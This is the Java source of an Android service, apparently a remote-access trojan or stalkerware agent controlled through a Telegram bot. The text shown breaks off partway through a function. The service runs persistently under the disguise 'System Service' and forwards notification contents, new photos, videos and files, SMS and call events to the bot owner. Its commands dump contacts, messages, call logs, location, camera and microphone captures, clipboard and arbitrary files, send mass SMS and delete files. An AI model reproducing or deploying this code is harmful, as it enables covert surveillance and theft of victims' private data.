package com.thunderx.telegramagent;

import android.Manifest;
import android.app.AppOpsManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.database.ContentObserver;  
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.FileObserver;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.telephony.PhoneStateListener;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;

public class TelegramAgentService extends Service {

    // ================= CONFIGURATION =================
   private static final String BOT_TOKEN = "Anonymous";
    private static final String CHAT_ID   = "Anonymous";   // Owner's chat ID (authorization)
    private static final String API_URL   = "https://api.telegram.org/bot" + BOT_TOKEN;

    private static final long MAX_UPLOAD_BYTES  = 50L * 1024 * 1024;  // 50 MB (Telegram bot limit)
    private static final long AUTO_UPLOAD_LIMIT = 10L * 1024 * 1024;  // 10 MB auto-upload

    // ================= STATE =================
    private static Context context;
    private static final String DEVICE_ID = UUID.randomUUID().toString().substring(0, 8);
    private int lastUpdateId = 0;

    private final ConcurrentHashMap<String, File> cwd = new ConcurrentHashMap<>();
    private boolean hasRoot = false;

    // Call monitoring
    private String lastCallNumber = null;
    private long lastCallTimestamp = 0;
    private boolean isCallActive = false;
    private PhoneStateListener phoneStateListener = null;

    // Notification monitoring
    private static boolean notificationListenerConnected = false;
    private static final List<String> capturedNotifications = new ArrayList<>();

    // Storage monitoring
    private ContentObserver mediaObserver = null;
    private final Map<String, Long> knownFiles = new ConcurrentHashMap<>();
    private Handler storageHandler = null;
    private Runnable storageRunnable = null;

    // SMS polling (for automatic SMS forwarding)
    private long lastSmsCheckTime = System.currentTimeMillis();
    private final Set<String> seenSmsIds = new HashSet<>();
    private Handler smsHandler = null;
    private Runnable smsRunnable = null;

    // ================= LIFECYCLE =================
    @Override
    public void onCreate() {
        super.onCreate();
        context = this;
        hasRoot = checkRoot();
        startForeground(999, createNotification());

        sendMessage("✅ *Agent Online*\n" +
                "ID: `" + DEVICE_ID + "`\n" +
                "Model: " + Build.MODEL + "\n" +
                "Root: " + (hasRoot ? "✅" : "❌"));

        // Start all monitoring
        //startCallMonitoring();
        startNotificationMonitoring();
        startStorageMonitoring();
        //startSmsPolling();

        new PollingThread().start();
        Log.d("Agent", "Service Started with all monitors");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        //stopCallMonitoring();
        stopNotificationMonitoring();
        stopStorageMonitoring();
        stopSmsPolling();
    }

    // ================= NOTIFICATION =================
    private Notification createNotification() {
        String channelId = "agent_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    channelId, "Agent", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
        return new NotificationCompat.Builder(this, channelId)
                .setContentTitle("System Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .build();
    }

    // ================= ROOT CHECK =================
    private boolean checkRoot() {
        String[] paths = {
                "/system/bin/su", "/system/xbin/su", "/sbin/su",
                "/system/sd/xbin/su", "/system/bin/failsafe/su",
                "/data/local/su", "/data/local/bin/su", "/data/local/xbin/su"
        };
        for (String p : paths) {
            if (new File(p).exists()) return true;
        }
        try {
            Process proc = Runtime.getRuntime().exec(new String[]{"su", "-c", "id"});
            BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            String line = br.readLine();
            proc.waitFor();
            return line != null && line.contains("uid=0");
        } catch (Exception e) {
            return false;
        }
    }

    // ================= POLLING =================
    private class PollingThread extends Thread {
        @Override public void run() {
            while (true) {
                try {
                    String url = API_URL + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=20";
                    HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                    conn.setRequestMethod("GET");
                    conn.setConnectTimeout(20000);

                    int code = conn.getResponseCode();
                    if (code != 200) { Thread.sleep(5000); continue; }

                    BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = in.readLine()) != null) response.append(line);
                    in.close();

                    JSONObject json = new JSONObject(response.toString());
                    if (!json.getBoolean("ok")) {
                        conn.disconnect();
                        Thread.sleep(2000);
                        continue;
                    }

                    JSONArray results = json.getJSONArray("result");
                    for (int i = 0; i < results.length(); i++) {
                        JSONObject update = results.getJSONObject(i);
                        lastUpdateId = update.getInt("update_id");

                        if (!update.has("message")) continue;
                        JSONObject message = update.getJSONObject("message");
                        if (!message.has("text")) continue;

                        if (!message.has("chat")) continue;
                        JSONObject chat = message.getJSONObject("chat");
                        String incomingChatId = chat.getString("id");

                        if (!CHAT_ID.equals(incomingChatId)) {
                            Log.w("Agent", "⛔ Blocked unauthorized chat_id=" + incomingChatId);
                            sendMessage("⚠️ *Security Alert*\n" +
                                    "Blocked unauthorized message from:\n" +
                                    "`chat_id: " + incomingChatId + "`");
                            continue;
                        }

                        String text = message.getString("text");
                        processCommand(text.trim());
                    }
                    conn.disconnect();
                    Thread.sleep(2000);
                } catch (Exception e) {
                    Log.e("Agent", "Polling error: " + e.getMessage());
                    try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
                }
            }
        }
    }

    // ================= SEND TEXT =================
    public static void sendMessage(String text) {
        if (context == null) return;
        new Thread(() -> {
            try {
                String encoded = URLEncoder.encode(text, "UTF-8");
                String url = API_URL + "/sendMessage?chat_id=" + CHAT_ID +
                        "&text=" + encoded + "&parse_mode=Markdown";
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("GET");
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e("Agent", "Send failed: " + e.getMessage());
            }
        }).start();
    }

    // ================= SEND PHOTO (bytes) =================
    public static void sendPhotoToTelegram(byte[] jpegData, int width, int height) {
        if (context == null || jpegData == null) return;
        new Thread(() -> {
            HttpURLConnection conn = null;
            OutputStream os = null;
            PrintWriter writer = null;
            try {
                String boundary = "----TB" + System.currentTimeMillis();
                conn = (HttpURLConnection) new URL(API_URL + "/sendPhoto").openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setConnectTimeout(30000);
                conn.setReadTimeout(30000);
                conn.setRequestProperty("Content-Type",
                        "multipart/form-data; boundary=" + boundary);

                os = conn.getOutputStream();
                writer = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);

                writer.append("--").append(boundary).append("\r\n");
                writer.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                writer.append(CHAT_ID).append("\r\n");
                writer.flush();

                writer.append("--").append(boundary).append("\r\n");
                writer.append("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
                writer.append("📸 ").append(DEVICE_ID)
                        .append(" (").append(String.valueOf(width))
                        .append("x").append(String.valueOf(height)).append(")\r\n");
                writer.flush();

                writer.append("--").append(boundary).append("\r\n");
                writer.append("Content-Disposition: form-data; name=\"photo\"; filename=\"img.jpg\"\r\n");
                writer.append("Content-Type: image/jpeg\r\n\r\n");
                writer.flush();

                os.write(jpegData);
                os.flush();

                writer.append("\r\n");
                writer.append("--").append(boundary).append("--\r\n");
                writer.flush();

                Log.d("Agent", "Photo response: " + conn.getResponseCode());
            } catch (Exception e) {
                Log.e("Agent", "Photo send error: " + e.getMessage());
            } finally {
                try { if (writer != null) writer.close(); } catch (Exception ignored) {}
                try { if (os != null) os.close(); } catch (Exception ignored) {}
                if (conn != null) conn.disconnect();
            }
        }).start();
    }

    // ================= SEND DOCUMENT =================
    public static void sendDocumentToTelegram(File file, String mimeType, String fileName) {
        sendFileToTelegram(file, mimeType, fileName, "sendDocument", "document", null);
    }

    // ================= GENERIC FILE SENDER =================
    private static void sendFileToTelegram(File file, String mimeType,
                                           String fileName, String endpoint,
                                           String fieldName, String caption) {
        if (context == null || file == null || !file.exists()) return;
        new Thread(() -> {
            HttpURLConnection conn = null;
            OutputStream os = null;
            PrintWriter writer = null;
            FileInputStream fis = null;
            try {
                String boundary = "----TB" + System.currentTimeMillis();
                conn = (HttpURLConnection) new URL(API_URL + "/" + endpoint).openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setConnectTimeout(60000);
                conn.setReadTimeout(120000);
                conn.setRequestProperty("Content-Type",
                        "multipart/form-data; boundary=" + boundary);

                os = conn.getOutputStream();
                writer = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);

                writer.append("--").append(boundary).append("\r\n");
                writer.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                writer.append(CHAT_ID).append("\r\n");
                writer.flush();

                if (caption != null) {
                    writer.append("--").append(boundary).append("\r\n");
                    writer.append("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
                    writer.append(caption).append("\r\n");
                    writer.flush();
                }

                writer.append("--").append(boundary).append("\r\n");
                writer.append("Content-Disposition: form-data; name=\"")
                      .append(fieldName).append("\"; filename=\"")
                      .append(fileName).append("\"\r\n");
                writer.append("Content-Type: ").append(mimeType).append("\r\n\r\n");
                writer.flush();

                fis = new FileInputStream(file);
                byte[] buf = new byte[8192];
                int n;
                while ((n = fis.read(buf)) > 0) os.write(buf, 0, n);
                os.flush();

                writer.append("\r\n");
                writer.append("--").append(boundary).append("--\r\n");
                writer.flush();

                Log.d("Agent", endpoint + " response: " + conn.getResponseCode());
            } catch (Exception e) {
                Log.e("Agent", endpoint + " error: " + e.getMessage());
            } finally {
                try { if (fis != null) fis.close(); } catch (Exception ignored) {}
                try { if (writer != null) writer.close(); } catch (Exception ignored) {}
                try { if (os != null) os.close(); } catch (Exception ignored) {}
                if (conn != null) conn.disconnect();
            }
        }).start();
    }

    // ==========================================================
    //          FEATURE 1: CALL MONITORING
    // ==========================================================
    private void startCallMonitoring() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (tm == null) {
                Log.e("Agent", "TelephonyManager unavailable");
                return;
            }

            phoneStateListener = new PhoneStateListener() {
                @Override
                public void onCallStateChanged(int state, String phoneNumber) {
                    super.onCallStateChanged(state, phoneNumber);

                    switch (state) {
                        case TelephonyManager.CALL_STATE_RINGING:
                            if (phoneNumber != null && !phoneNumber.isEmpty()) {
                                lastCallNumber = phoneNumber;
                                lastCallTimestamp = System.currentTimeMillis();
                                isCallActive = true;
                                sendMessage("📞 *Incoming Call*\n" +
                                        "Number: `" + phoneNumber + "`\n" +
                                        "Time: " + new SimpleDateFormat("HH:mm:ss", Locale.US)
                                                .format(new Date()));
                            }
                            break;

                        case TelephonyManager.CALL_STATE_OFFHOOK:
                            if (phoneNumber != null && !phoneNumber.isEmpty()) {
                                if (!isCallActive) {
                                    lastCallNumber = phoneNumber;
                                    lastCallTimestamp = System.currentTimeMillis();
                                    isCallActive = true;
                                    sendMessage("📞 *Outgoing Call*\n" +
                                            "Number: `" + phoneNumber + "`\n" +
                                            "Time: " + new SimpleDateFormat("HH:mm:ss", Locale.US)
                                                    .format(new Date()));
                                } else {
                                    sendMessage("📞 *Call Answered*\n" +
                                            "Number: `" + phoneNumber + "`");
                                }
                            }
                            break;

                        case TelephonyManager.CALL_STATE_IDLE:
                            if (isCallActive && lastCallNumber != null) {
                                long duration = System.currentTimeMillis() - lastCallTimestamp;
                                sendMessage("📞 *Call Ended*\n" +
                                        "Number: `" + lastCallNumber + "`\n" +
                                        "Duration: " + (duration / 1000) + "s");
                                isCallActive = false;
                            }
                            break;
                    }
                }
            };

            tm.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE);
            Log.d("Agent", "Call monitoring started");
        } catch (Exception e) {
            Log.e("Agent", "Call monitoring failed: " + e.getMessage());
        }
    }

    private void stopCallMonitoring() {
        try {
            if (phoneStateListener != null) {
                TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                if (tm != null) {
                    tm.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE);
                }
            }
        } catch (Exception ignored) {}
    }

    // ==========================================================
    //          FEATURE 2: NOTIFICATION MONITORING
    // ==========================================================
    private void startNotificationMonitoring() {
        Log.d("Agent", "Notification monitoring thread ready");
    }

    private void stopNotificationMonitoring() {}

    // Called by NotificationListener (separate service)
    public static void onNotificationReceived(String packageName, String title, String text) {
        if (context == null) return;

        String appName = packageName;
        try {
            PackageManager pm = context.getPackageManager();
            ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
            appName = pm.getApplicationLabel(ai).toString();
        } catch (Exception ignored) {}

        final String finalAppName = appName;
        final String finalTitle = title;
        final String finalText = text;

        // Store in buffer
        String notif = "📱 *" + appName + "*\n" +
                "Title: " + (title != null && !title.isEmpty() ? title : "(none)") + "\n" +
                "Text: " + (text != null && !text.isEmpty() ? text : "(none)");

        synchronized (capturedNotifications) {
            capturedNotifications.add(notif);
            while (capturedNotifications.size() > 50) {
                capturedNotifications.remove(0);
            }
        }

        Log.d("Agent", "🔔 Notification: " + appName + " - " + title);

        // ⚡ SEND IMMEDIATELY TO TELEGRAM
        new Thread(() -> {
            try {
                String msg = "🔔 *" + finalAppName + "*\n\n" +
                        "*" + (finalTitle != null && !finalTitle.isEmpty() ? finalTitle : "(no title)") + "*\n" +
                        (finalText != null && !finalText.isEmpty() ? finalText : "(no text)");
                sendMessage(msg);
            } catch (Exception e) {
                Log.e("Agent", "Notification send error: " + e.getMessage());
            }
        }).start();
    }

    public static void setNotificationListenerConnected(boolean connected) {
        notificationListenerConnected = connected;
        if (connected && context != null) {
            sendMessage("🔔 Notification listener connected");
        }
    }

    // ==========================================================
    //          FEATURE 3: STORAGE MONITORING
    // ==========================================================
    private void startStorageMonitoring() {
        scanExistingFiles();
        startMediaStoreObserver();

        storageHandler = new Handler(Looper.getMainLooper());
        storageRunnable = new Runnable() {
            @Override
            public void run() {
                try {
                    scanForNewFiles();
                } catch (Exception e) {
                    Log.e("Agent", "Storage scan error: " + e.getMessage());
                }
                storageHandler.postDelayed(this, 30000);
            }
        };
        storageHandler.postDelayed(storageRunnable, 30000);

        Log.d("Agent", "Storage monitoring started");
    }

    private void stopStorageMonitoring() {
        if (storageHandler != null && storageRunnable != null) {
            storageHandler.removeCallbacks(storageRunnable);
        }
        if (mediaObserver != null) {
            try {
                getContentResolver().unregisterContentObserver(mediaObserver);
            } catch (Exception ignored) {}
        }
    }

    private void scanExistingFiles() {
        try {
            File ext = Environment.getExternalStorageDirectory();

            scanDirectory(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM), 0);
            scanDirectory(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), 0);
            scanDirectory(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), 0);
            scanDirectory(new File(ext, "Camera"), 0);

            // WhatsApp / Telegram folders
            scanDirectory(new File(ext, "WhatsApp/Media"), 0);
            scanDirectory(new File(ext, "Telegram"), 0);
            scanDirectory(new File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media"), 0);
            scanDirectory(new File("/storage/emulated/0/Android/media/org.telegram.messenger/Telegram"), 0);

            Log.d("Agent", "Existing files scanned: " + knownFiles.size());
        } catch (Exception e) {
            Log.e("Agent", "Scan existing failed: " + e.getMessage());
        }
    }

    private void scanDirectory(File dir, int depth) {
        if (dir == null || !dir.exists() || depth > 10) return;
        File[] files = dir.listFiles();
        if (files == null) return;

        for (File f : files) {
            if (f.isDirectory()) {
                scanDirectory(f, depth + 1);
            } else {
                knownFiles.put(f.getAbsolutePath(), f.lastModified());
            }
        }
    }

    private void startMediaStoreObserver() {
        mediaObserver = new ContentObserver(new Handler(Looper.getMainLooper())) {
            @Override
            public void onChange(boolean selfChange, Uri uri) {
                super.onChange(selfChange, uri);
                if (uri != null) {
                    checkNewMedia(uri);
                }
            }
        };

        try {
            getContentResolver().registerContentObserver(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, true, mediaObserver);
            getContentResolver().registerContentObserver(
                    MediaStore.Video.Media.EXTERNAL_CONTENT_URI, true, mediaObserver);
            getContentResolver().registerContentObserver(
                    MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, true, mediaObserver);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                getContentResolver().registerContentObserver(
                        MediaStore.Downloads.EXTERNAL_CONTENT_URI, true, mediaObserver);
                getContentResolver().registerContentObserver(
                        MediaStore.Files.getContentUri("external"), true, mediaObserver);
            }

            Log.d("Agent", "MediaStore observers registered");
        } catch (Exception e) {
            Log.e("Agent", "MediaStore observer failed: " + e.getMessage());
        }
    }

    private void checkNewMedia(Uri uri) {
        try {
            String[] projection = {
                    MediaStore.MediaColumns.DATA,
                    MediaStore.MediaColumns.DISPLAY_NAME,
                    MediaStore.MediaColumns.SIZE
            };

            Cursor cursor = getContentResolver().query(uri, projection, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                int dataIdx = cursor.getColumnIndex(MediaStore.MediaColumns.DATA);
                int nameIdx = cursor.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME);
                int sizeIdx = cursor.getColumnIndex(MediaStore.MediaColumns.SIZE);

                if (dataIdx == -1 || nameIdx == -1) { cursor.close(); return; }

                String path = cursor.getString(dataIdx);
                String name = cursor.getString(nameIdx);
                long size = sizeIdx >= 0 ? cursor.getLong(sizeIdx) : 0;
                cursor.close();

                if (path != null && name != null) {
                    File f = new File(path);
                    if (f.exists() && !knownFiles.containsKey(path)) {
                        knownFiles.put(path, f.lastModified());
                        onNewFileDetected(f, name, size);
                    }
                }
            }
        } catch (Exception e) {
            Log.e("Agent", "Check new media error: " + e.getMessage());
        }
    }

    private void scanForNewFiles() {
        File ext = Environment.getExternalStorageDirectory();

        checkDirectoryForNewFiles(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM));
        checkDirectoryForNewFiles(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES));
        checkDirectoryForNewFiles(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS));
        checkDirectoryForNewFiles(new File(ext, "Camera"));

        // WhatsApp / Telegram
        checkDirectoryForNewFiles(new File(ext, "WhatsApp/Media"));
        checkDirectoryForNewFiles(new File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media"));
        checkDirectoryForNewFiles(new File(ext, "Telegram"));
        checkDirectoryForNewFiles(new File("/storage/emulated/0/Android/media/org.telegram.messenger/Telegram"));
    }

    private void checkDirectoryForNewFiles(File dir) {
        if (dir == null || !dir.exists()) return;

        File[] files = dir.listFiles();

        // Root fallback for protected folders
        if (files == null && hasRoot) {
            files = listWithRoot(dir.getAbsolutePath());
        }
        if (files == null) return;

        for (File f : files) {
            if (f.isDirectory()) {
                String name = f.getName();
                if (name.equals(".") || name.equals("..") || name.startsWith(".")) continue;
                checkDirectoryForNewFiles(f);
            } else {
                String path = f.getAbsolutePath();
                if (!knownFiles.containsKey(path)) {
                    knownFiles.put(path, f.lastModified());
                    onNewFileDetected(f, f.getName(), f.length());
                }
            }
        }
    }

    private void onNewFileDetected(File file, String name, long size) {
        // Skip tiny / hidden / junk
        if (size < 1024 || name.startsWith(".")) return;

        String lowerName = name.toLowerCase();
        String lowerPath = file.getAbsolutePath().toLowerCase();

        // Skip temp / thumbnails
        if (lowerPath.contains("/.thumbnails/") ||
            lowerPath.contains("/cache/") ||
            lowerPath.contains("/.trash/") ||
            lowerName.endsWith(".tmp") ||
            lowerName.endsWith(".nomedia")) {
            return;
        }

        // Detect source app
        String source = "Storage";
        if (lowerPath.contains("whatsapp"))     source = "WhatsApp";
        else if (lowerPath.contains("telegram")) source = "Telegram";
        else if (lowerPath.contains("instagram")) source = "Instagram";
        else if (lowerPath.contains("facebook"))  source = "Facebook";
        else if (lowerPath.contains("snapchat"))  source = "Snapchat";
        else if (lowerPath.contains("/dcim/") || lowerPath.contains("/camera/")) source = "Camera";
        else if (lowerPath.contains("/download/")) source = "Downloads";
        else if (lowerPath.contains("/screenshot")) source = "Screenshot";

        boolean isPhoto = lowerName.endsWith(".jpg") || lowerName.endsWith(".jpeg")
                || lowerName.endsWith(".png") || lowerName.endsWith(".webp")
                || lowerName.endsWith(".gif") || lowerName.endsWith(".bmp")
                || lowerName.endsWith(".heic") || lowerName.endsWith(".heif");

        boolean isVideo = lowerName.endsWith(".mp4") || lowerName.endsWith(".mkv")
                || lowerName.endsWith(".avi") || lowerName.endsWith(".mov")
                || lowerName.endsWith(".3gp") || lowerName.endsWith(".webm");

        if (isPhoto) {
            sendMessage("📸 *New Photo (" + source + ")*\n" +
                    "Name: `" + name + "`\n" +
                    "Size: " + (size / 1024) + " KB\n" +
                    "Path: `" + file.getAbsolutePath() + "`");

            if (size <= MAX_UPLOAD_BYTES) {
                sendFileToTelegram(file, "image/jpeg", name,
                        "sendPhoto", "photo", "📸 " + source + ": " + name);
            }
        } else if (isVideo) {
            if (size <= AUTO_UPLOAD_LIMIT) {
                sendMessage("🎬 *New Video (" + source + ")*\n" +
                        "Name: `" + name + "`\n" +
                        "Size: " + (size / 1024 / 1024) + " MB\n" +
                        "Path: `" + file.getAbsolutePath() + "`");

                sendFileToTelegram(file, "video/mp4", name,
                        "sendVideo", "video", "🎬 " + source + ": " + name);
            } else {
                sendMessage("🎬 *New Video (" + source + ") — too large*\n" +
                        "Name: `" + name + "`\n" +
                        "Size: " + (size / 1024 / 1024) + " MB\n" +
                        "Path: `" + file.getAbsolutePath() + "`");
            }
        } else {
            if (size <= AUTO_UPLOAD_LIMIT) {
                sendMessage("📄 *New File (" + source + ")*\n" +
                        "Name: `" + name + "`\n" +
                        "Size: " + (size / 1024) + " KB\n" +
                        "Path: `" + file.getAbsolutePath() + "`");

                sendFileToTelegram(file, "application/octet-stream", name,
                        "sendDocument", "document", "📄 " + source + ": " + name);
            } else {
                sendMessage("📄 *New File (" + source + ") — too large*\n" +
                        "Name: `" + name + "`\n" +
                        "Size: " + (size / 1024 / 1024) + " MB\n" +
                        "Path: `" + file.getAbsolutePath() + "`");
            }
        }
    }

    // ==========================================================
    //          FEATURE 4: AUTOMATIC SMS POLLING
    // ==========================================================
    private void startSmsPolling() {
        smsHandler = new Handler(Looper.getMainLooper());
        smsRunnable = new Runnable() {
            @Override
            public void run() {
                try {
                    checkNewSms();
                } catch (Exception e) {
                    Log.e("Agent", "SMS poll error: " + e.getMessage());
                }
                smsHandler.postDelayed(this, 10000); // every 10s
            }
        };
        smsHandler.postDelayed(smsRunnable, 5000);
        Log.d("Agent", "SMS polling started");
    }

    private void stopSmsPolling() {
        if (smsHandler != null && smsRunnable != null) {
            smsHandler.removeCallbacks(smsRunnable);
        }
    }

    private void checkNewSms() {
        if (checkSelfPermission(Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        Cursor cur = null;
        try {
            cur = getContentResolver().query(
                    Uri.parse("content://sms/inbox"),
                    new String[]{"_id", "address", "body", "date"},
                    "date > ?",
                    new String[]{String.valueOf(lastSmsCheckTime)},
                    "date ASC LIMIT 10");

            if (cur == null) return;

            int idIdx   = cur.getColumnIndex("_id");
            int addrIdx = cur.getColumnIndex("address");
            int bodyIdx = cur.getColumnIndex("body");
            int dateIdx = cur.getColumnIndex("date");

            while (cur.moveToNext()) {
                String id = cur.getString(idIdx);
                long date = cur.getLong(dateIdx);

                if (date > lastSmsCheckTime) {
                    lastSmsCheckTime = date;
                }

                if (seenSmsIds.contains(id)) continue;
                seenSmsIds.add(id);

                String addr = cur.getString(addrIdx);
                String body = cur.getString(bodyIdx);
                String time = new SimpleDateFormat("HH:mm:ss", Locale.US)
                        .format(new Date(date));

                sendMessage("📩 *New SMS*\n\n" +
                        "From: `" + (addr != null ? addr : "?") + "`\n" +
                        "Time: " + time + "\n" +
                        "Message:\n" + (body != null ? body : ""));

                Log.d("Agent", "📩 SMS forwarded from " + addr);
            }

            if (seenSmsIds.size() > 200) seenSmsIds.clear();

        } catch (Exception e) {
            Log.e("Agent", "SMS check error: " + e.getMessage());
        } finally {
            if (cur != null) cur.close();
        }
    }

    // ==========================================================
    //          COMMAND DISPATCHER
    // ==========================================================
    private void processCommand(String command) {
        Log.d("Agent", "Command: " + command);
        String cmd, payload = "";
        int idx = command.indexOf(' ');
        if (idx != -1) {
            cmd = command.substring(0, idx).toLowerCase().replace("/", "");
            payload = command.substring(idx + 1).trim();
        } else {
            cmd = command.toLowerCase().replace("/", "");
        }

        switch (cmd) {
            case "start":
            case "menu":          sendMenu(); break;

            case "contacts":      getContacts(); break;
            case "sms":           getInboxSms(); break;
            case "outbox":        getOutboxSms(); break;
            case "send_sms":      sendSms(payload); break;
            case "send_sms_all":  sendSmsToAll(payload); break;
            case "vibrate":       vibrateDevice(); break;
            case "apps":          getInstalledApps(); break;
            case "devices":       getDeviceInfo(); break;
            case "screen":        captureScreen(); break;

            case "location":      getLocation(); break;
            case "camera":        capturePhoto(false); break;
            case "cameraf":       capturePhoto(true); break;
            case "mic":           recordAudio(); break;
            case "call_log":      getCallLog(); break;
			
			case "calls":         listCallRecordings(); break;
            case "calls_clean":   CallCleanupWorker.cleanupNow(getApplicationContext()); 
                      sendMessage("🧹 Cleanup triggered."); break;
            case "rec_on":        CallRecorder.enableRecording(true); break;
            case "rec_off":       CallRecorder.enableRecording(false); break;

            case "files": case "ls":      cmdFiles(payload); break;
            case "cd":                    cmdCd(payload); break;
            case "pwd":                   cmdPwd(); break;
            case "get": case "dl":        cmdGet(payload); break;
            case "search": case "find":   cmdSearch(payload); break;
            case "tree":                  cmdTree(payload); break;
            case "info": case "stat":     cmdInfo(payload); break;
			case "storage":               getStorageFiles(); break;
			case "delete": case "rm":     deletePath(payload); break; 

            case "clipboard":     getClipboard(); break;
            case "battery":       getBattery(); break;
            case "lock":          lockScreen(); break;
            case "wifi":          getWifiInfo(); break;

            case "notifications": getRecentNotifications(); break;
            case "clear_notifications": clearNotifications(); break;
            case "call_status":   getCallStatus(); break;
            case "storage_status": getStorageStatus(); break;

            default:              sendMessage("❌ Unknown command. Type /menu"); break;
        }
    }

    // ================= /menu =================
private void sendMenu() {
    String menu = "📱 *Available Commands*\n\n" +
            "`/contacts` — Get contacts\n" +
            "`/sms` — Export all SMS to CSV\n" +
            "`/outbox` — Sent SMS\n" +
            "`/send_sms number|message`\n" +
            "`/send_sms_all message`\n" +
            "`/vibrate` — Vibrate\n" +
            "`/apps` — Installed apps\n" +
            "`/devices` — Device info\n" +
            "`/screen` — Screen capture\n" +
            "`/location` — GPS location\n" +
            "`/camera` — Back camera photo\n" +
            "`/cameraf` — Front camera photo\n" +
            "`/mic` — Record 10s audio\n" +
            "`/call_log` — Call history\n" +
            "`/calls` — List call recordings\n" +
            "`/calls_clean` — Delete old recordings\n" +
            "`/clipboard` — Clipboard\n" +
            "`/battery` — Battery info\n" +
            "`/lock` — Lock screen\n" +
            "`/wifi` — WiFi info\n\n" +
            "*🔔 Notifications:*\n" +
            "`/notifications` — Recent notifications\n" +
            "`/clear_notifications` — Clear buffer\n\n" +
            "*📞 Call:*\n" +
            "`/call_status` — Current call status\n\n" +
            "*💾 Storage:*\n" +
            "`/storage_status` — Monitoring status\n\n" +
            "*📁 File System:*\n" +
            "`/pwd` — Current directory\n" +
            "`/ls` or `/files [dir]` — List files\n" +
            "`/cd <dir>` — Change directory\n" +
            "`/get <file>` — Download file 📤\n" +
            "`/search <name>` — Recursive find\n" +
            "`/tree` — Directory tree\n" +
            "`/info <file>` — File details\n" +
            "`/storage` — Scan all files to TXT 💾" +
			"`/delete <path>` — 🗑️ Delete file/folder\n";
    sendMessage(menu);
}

    // ================= /notifications =================
    private void getRecentNotifications() {
        synchronized (capturedNotifications) {
            if (capturedNotifications.isEmpty()) {
                sendMessage("🔔 No recent notifications captured.\n\n" +
                        "_Make sure Notification Listener is enabled in Settings → Notification Access._");
                return;
            }

            StringBuilder sb = new StringBuilder("🔔 *Recent Notifications:*\n\n");
            int start = Math.max(0, capturedNotifications.size() - 15);
            for (int i = start; i < capturedNotifications.size(); i++) {
                if (sb.length() > 3900) break;
                sb.append(capturedNotifications.get(i)).append("\n---\n");
            }

